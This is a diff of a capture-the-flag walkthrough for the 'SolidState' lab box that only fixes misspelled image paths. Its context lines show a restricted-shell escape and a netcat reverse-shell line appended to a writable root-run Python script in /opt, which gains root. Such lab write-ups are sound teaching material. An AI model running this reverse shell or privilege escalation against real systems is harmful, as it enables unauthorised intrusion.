@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-![SolidState.png](../assets/soldidstate_assets/SolidState.png)
+![SolidState.png](../assets/solidstate_assets/SolidState.png)
 
 ### Enumeration
 
@@ -74,7 +74,7 @@ Nmap done: 1 IP address (1 host up) scanned in 262.72 seconds
 
 Checking out the website on port 80, we find a page for a security company:
 
-![site.png](../assets/soldidstate_assets/site.png)
+![site.png](../assets/solidstate_assets/site.png)
 
 But before digging into HTTP too much, I want to take a look at the James Remote Administraation tool on port 4555. 
 
@@ -205,21 +205,21 @@ James
 
 Nice! These are SSH credentials. Unfortunately for us, the SSH access is in a restricted shell. But we can get around this by adding the `-t bash` flag as we login, which gives us a proper bash shell.
 
-![bash.png](../assets/soldidstate_assets/bash.png)
+![bash.png](../assets/solidstate_assets/bash.png)
 
 We can now grab the user.txt flag:
 
-![user_flag.png](../assets/soldidstate_assets/user_flag.png)
+![user_flag.png](../assets/solidstate_assets/user_flag.png)
 
 ### Privilege Escalation
 
 Lets transfer over a copy of Linpeas to the tadrget to help with enumeration:
 
-![lp_transf.png](../assets/soldidstate_assets/lp_transf.png)
+![lp_transf.png](../assets/solidstate_assets/lp_transf.png)
 
 Interesting, Linpeas finds a couple of things in the `/opt` directory, and one file is owned by root, but can be modified and executed by us. This is juicy.
 
-![opt.png](../assets/soldidstate_assets/opt.png)
+![opt.png](../assets/solidstate_assets/opt.png)
 
 Checking out the file more, we can see it is a python script that removes files in the `/tmp` directory
 
@@ -246,11 +246,11 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.35 443')" >> /opt/tmp.py
 ```
 After waiting a few minutes we caught a shell back as root on our listener!
 
-![shell.png](../assets/soldidstate_assets/shell.png)
+![shell.png](../assets/solidstate_assets/shell.png)
 
 Now we can grab the final root.txt flag:
 
-![root_flag.png](../assets/soldidstate_assets/root_flag.png)
+![root_flag.png](../assets/solidstate_assets/root_flag.png)
 
 Thanks for following along!
 
